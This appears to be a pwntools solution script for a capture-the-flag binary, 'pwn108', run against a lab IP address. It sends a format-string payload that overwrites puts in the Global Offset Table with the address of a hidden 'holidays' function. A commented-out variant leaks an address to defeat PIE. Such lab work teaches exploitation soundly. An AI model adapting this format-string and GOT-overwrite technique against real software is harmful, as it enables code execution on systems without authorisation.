from pwn import *
#  GOT = Global Offset Table It’s a table used by dynamically-linked binaries to resolve addresses of external functions (like puts, printf, etc.) at runtime
e = ELF("./pwn108")
context.binary = e.path
holidays = e.symbols['holidays']
puts_got = e.got['puts']

DEBUG = 1
if DEBUG == 0 :
    p = process("./pwn108")
else : 
    p = remote("10.10.253.250", 9008)

p.recvuntil(b"=[Your name]:")
p.sendline(b"Zayd")
p.recvuntil(b"=[Your Reg No]:")    
offset = 10 # aaaaaa %10$p is where the first appearance of 61 so that' s the start of the stack
addr_dict = {puts_got : holidays} # overwrite puts.got (the pointer to puts that contains puts address) address with holidays address 
payload = fmtstr_payload(offset, addr_dict, write_size='short')
p.sendline(payload)
p.interactive()

# ======== IF PIE was enabled ========= #


# main_offset = e.symbols['main']
# holidays_offset = e.symbols['holidays']
# puts_got_offset = e.got['puts']
# DEBUG = 0 
# if DEBUG == 0 :
#     p = process("./pwn108")
# else : 
#     p = remote("",)
# p.recvuntil(b"=[Your name]:")
# p.sendline(b"Zayd")

# p.recvuntil(b"=[Your Reg No]:")
# p.sendline(b"%27$p")
# p.recvuntil(b"Register no  : ")
# leak_addr = p.recvline().strip().decode().split()

# main_addr = leak_addr[0]
# pie_base = int(main_addr,16) - main_offset
# puts_got = pie_base + puts_got_offset
# win_addr = pie_base + holidays_offset
# print(f"main address: {main_addr}")
# print(f"PIE : {pie_base}")
# print(f"puts_got : {hex(puts_got)}")
# p.close()


